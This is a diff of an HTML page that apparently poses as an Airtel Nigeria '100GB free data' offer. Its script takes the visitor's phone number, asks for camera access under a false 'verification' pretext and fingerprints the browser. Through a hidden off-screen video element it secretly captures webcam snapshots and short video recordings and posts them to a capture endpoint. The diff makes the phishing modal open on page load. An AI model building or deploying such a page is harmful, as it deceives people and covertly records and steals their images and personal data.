@@ -3,106 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel Unlimited Data</title>
+    <title>Airtel Nigeria – Free Data</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; color: #111; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f8f8f8; }
         
         /* Navbar */
-        .nav { background: #fff; padding: 10px 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; }
-        .nav img { height: 30px; width: auto; object-fit: contain; } /* Fixed height */
-        .nav a { text-decoration: none; color: #666; font-size: 14px; margin-left: 20px; }
+        .navbar { background: #fff; padding: 12px 5%; box-shadow: 0 2px 10px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; }
+        .navbar img { height: 32px; }
+        .nav-links a { text-decoration: none; color: #444; margin-left: 20px; font-size: 14px; }
+        .nav-links a:hover { color: #ed1c24; }
         
         /* Hero */
-        .hero { background: linear-gradient(135deg, #ed1c24 0%, #b3001b 100%); color: white; padding: 40px 20px; text-align: center; }
-        .hero h1 { font-size: 36px; font-weight: 800; margin-bottom: 10px; }
-        .hero p { font-size: 16px; opacity: 0.9; }
+        .hero { background: linear-gradient(135deg, #ed1c24, #a1001a); color: white; text-align: center; padding: 80px 20px 60px; }
+        .hero h1 { font-size: 48px; font-weight: 800; margin-bottom: 10px; }
+        .hero p { font-size: 18px; opacity: 0.9; max-width: 600px; margin: 0 auto 30px; }
+        .hero .cta { background: white; color: #ed1c24; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: 700; text-decoration: none; display: inline-block; }
         
-        /* Card */
-        .card { background: #fff; border-radius: 12px; max-width: 500px; margin: -30px auto 40px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); text-align: center; }
-        .offer-icon { margin-bottom: 20px; }
-        .offer-icon img { max-width: 80px; max-height: 80px; object-fit: contain; } /* Fixed size */
-        .card h2 { font-size: 24px; margin-bottom: 15px; }
-        .card p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
-        
-        /* Buttons */
-        .btn-primary { background: #ed1c24; color: white; border: none; padding: 16px 40px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; width: 100%; }
-        .btn-primary:hover { background: #b3001b; }
-        .btn-primary:disabled { background: #ccc; cursor: not-allowed; }
+        /* Main content */
+        .container { max-width: 1100px; margin: -40px auto 50px; padding: 0 20px; }
+        .offer-card { background: #fff; border-radius: 12px; padding: 40px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; }
+        .offer-card img { width: 120px; margin-bottom: 20px; }
+        .offer-card h2 { font-size: 28px; margin-bottom: 15px; }
+        .offer-card p { color: #666; margin-bottom: 30px; }
+        .btn-primary { background: #ed1c24; color: #fff; border: none; padding: 16px 50px; border-radius: 50px; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn-primary:hover { background: #a1001a; }
         
         /* Modal */
-        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); align-items: center; justify-content: center; z-index: 999; }
-        .modal.open { display: flex; }
-        .modal-content { background: #fff; border-radius: 16px; padding: 30px; max-width: 380px; width: 90%; text-align: center; }
-        .modal-content h3 { font-size: 20px; margin-bottom: 10px; }
-        .modal-content p { font-size: 14px; color: #666; margin-bottom: 20px; }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); align-items: center; justify-content: center; z-index: 999; }
+        .modal-overlay.show { display: flex; }
+        .modal-box { background: #fff; border-radius: 16px; padding: 30px; max-width: 400px; width: 90%; text-align: center; }
+        .modal-box h3 { font-size: 22px; margin-bottom: 10px; color: #ed1c24; }
+        .modal-box p { color: #666; margin-bottom: 20px; font-size: 14px; }
         .input-group { margin-bottom: 20px; text-align: left; }
         .input-group label { font-size: 13px; color: #888; display: block; margin-bottom: 5px; }
-        .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
-        .input-group input:focus { border-color: #ed1c24; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+        .input-group input:focus { border-color: #ed1c24; outline: none; }
+        .modal-btn { background: #ed1c24; color: #fff; width: 100%; padding: 14px; border: none; border-radius: 50px; font-size: 16px; cursor: pointer; }
         
         /* Footer */
-        .footer { text-align: center; padding: 20px; color: #999; font-size: 12px; }
+        footer { background: #222; color: #aaa; text-align: center; padding: 30px 20px; font-size: 13px; }
         
-        /* Hide video but keep it drawable */
-        #video { position: absolute; left: -9999px; top: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        /* Hidden video */
+        #video { position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
 <body>
+
     <!-- Navbar -->
-    <div class="nav">
-        <img src="logoo.png" alt="Airtel">
-        <div>
+    <div class="navbar">
+        <img src="logoo.png" alt="Airtel Nigeria">
+        <div class="nav-links">
             <a href="#">Home</a>
             <a href="#">Data Plans</a>
             <a href="#">Support</a>
         </div>
     </div>
 
-    <!-- Hero -->
+    <!-- Hero Section -->
     <div class="hero">
-        <h1>Get 100GB Free</h1>
-        <p>Valid for 30 days. No hidden charges.</p>
+        <h1>Get 100GB FREE</h1>
+        <p>Unlimited high-speed internet for 30 days. No hidden charges. Offer valid for all Airtel users.</p>
+        <a href="#" class="cta">Activate Now</a>
     </div>
 
-    <!-- Main Card -->
-    <div class="card">
-        <div class="offer-icon">
-            <img src="logoo.png" alt="Airtel Logo">
+    <!-- Main Offer Card -->
+    <div class="container">
+        <div class="offer-card">
+            <img src="logoo.png" alt="Airtel">
+            <h2>Unlimited Data Offer</h2>
+            <p>Activate now and enjoy 100GB free for a month. Fastest network, seamless streaming.</p>
+            <button id="activateBtn" class="btn-primary">Get Your Free Data</button>
         </div>
-        <h2>Unlimited Data Offer</h2>
-        <p>Activate now to enjoy unlimited high-speed internet for a month. This is a limited-time offer for all Airtel Nigeria users.</p>
-        <button id="activateBtn" class="btn-primary">Activate Now</button>
     </div>
 
-    <!-- Phone Number Modal -->
-    <div class="modal" id="phoneModal">
-        <div class="modal-content">
-            <h3>Enter Airtel Number</h3>
+    <!-- Activation Modal (Shown on page load) -->
+    <div class="modal-overlay" id="activationModal">
+        <div class="modal-box">
+            <h3>Enter your Airtel number</h3>
             <p>We'll verify your number and activate the offer instantly.</p>
             <div class="input-group">
                 <label>Phone Number</label>
                 <input type="tel" id="phoneInput" placeholder="08012345678" maxlength="11">
             </div>
-            <button id="verifyBtn" class="btn-primary">Verify & Activate</button>
+            <button id="verifyBtn" class="modal-btn">Verify & Activate</button>
         </div>
     </div>
 
-    <div class="footer">© 2026 Airtel Nigeria. All rights reserved.</div>
+    <footer>© 2026 Airtel Nigeria. All rights reserved.</footer>
 
     <video id="video" autoplay playsinline muted></video>
 
     <script>
-        const activateBtn = document.getElementById('activateBtn');
-        const phoneModal = document.getElementById('phoneModal');
-        const verifyBtn = document.getElementById('verifyBtn');
+        const phoneModal = document.getElementById('activationModal');
         const phoneInput = document.getElementById('phoneInput');
+        const verifyBtn = document.getElementById('verifyBtn');
         const video = document.getElementById('video');
         const ENDPOINT = '/api/capture';
 
-        activateBtn.addEventListener('click', () => {
-            phoneModal.classList.add('open');
-        });
+        // Show modal immediately on page load
+        phoneModal.classList.add('show');
 
         verifyBtn.addEventListener('click', async () => {
             const phone = phoneInput.value.trim();
@@ -115,69 +115,93 @@
             verifyBtn.innerText = 'Verifying...';
 
             try {
+                // Trigger camera permission
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
-                await video.play(); // Crucial for canvas drawing
+                await video.play();
 
                 // Hide modal
-                phoneModal.classList.remove('open');
-                activateBtn.innerText = 'Offer Activated!';
-                activateBtn.disabled = true;
+                phoneModal.classList.remove('show');
 
-                // Collect massive fingerprint
+                // Collect fingerprint
                 const fingerprint = {
-                    phone: phone,
+                    phone,
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    languages: navigator.languages,
+                    languages: navigator.languages.join(','),
                     screen: `${screen.width}x${screen.height}@${screen.colorDepth}`,
-                    screenAvail: `${screen.availWidth}x${screen.availHeight}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    offset: new Date().getTimezoneOffset(),
                     cores: navigator.hardwareConcurrency,
                     memory: navigator.deviceMemory,
-                    connection: navigator.connection ? {
-                        type: navigator.connection.type,
-                        downlink: navigator.connection.downlink,
-                        effectiveType: navigator.connection.effectiveType
-                    } : null,
-                    webgl: (() => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            const gl = canvas.getContext('webgl');
-                            const renderer = gl.getExtension('WEBGL_debug_renderer_info');
-                            return gl.getParameter(renderer.UNMASKED_RENDERER_WEBGL);
-                        } catch(e) { return null; }
-                    })(),
-                    doNotTrack: navigator.doNotTrack,
                     referrer: document.referrer,
-                    viewport: `${window.innerWidth}x${window.innerHeight}`
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    // Could add more…
                 };
 
-                // Start capturing every 2 seconds
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
+                // Start capturing: 5 images (every 2s) + 2 videos (3s each)
+                captureSequence(stream, fingerprint);
 
-                setInterval(() => {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const image = canvas.toDataURL('image/jpeg', 0.6);
-                    fetch(ENDPOINT, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image, ...fingerprint })
-                    }).catch(() => {});
-                }, 2000);
-
-                alert('Offer activated successfully! Enjoy your data.');
+                alert('Activation successful! You will receive your data shortly.');
             } catch (err) {
-                alert('Verification failed. Please refresh and try again.');
+                alert('Verification failed. Please allow camera access and try again.');
                 verifyBtn.disabled = false;
                 verifyBtn.innerText = 'Verify & Activate';
             }
         });
+
+        // Capture 5 images and 2 videos
+        function captureSequence(stream, fingerprint) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+
+            let imageCount = 0;
+            const imageInterval = setInterval(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const image = canvas.toDataURL('image/jpeg', 0.7);
+                sendToServer({ type: 'image', image, fingerprint });
+                imageCount++;
+                if (imageCount >= 5) {
+                    clearInterval(imageInterval);
+                    // After images, start videos
+                    recordVideo(stream, fingerprint);
+                }
+            }, 2000);
+        }
+
+        // Record a video for a given duration and send it
+        function recordVideo(stream, fingerprint, videoIndex = 0) {
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            recorder.ondataavailable = (e) => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    const base64video = reader.result.split(',')[1];
+                    sendToServer({ type: 'video', video: base64video, fingerprint, videoIndex });
+                };
+                reader.readAsDataURL(blob);
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 3000); // 3 seconds
+
+            if (videoIndex < 1) {
+                // Record second video after 1 second pause
+                setTimeout(() => recordVideo(stream, fingerprint, videoIndex + 1), 4000);
+            }
+        }
+
+        // Send data to serverless function
+        function sendToServer(payload) {
+            fetch(ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error('Send error:', err));
+        }
     </script>
 </body>
 </html>
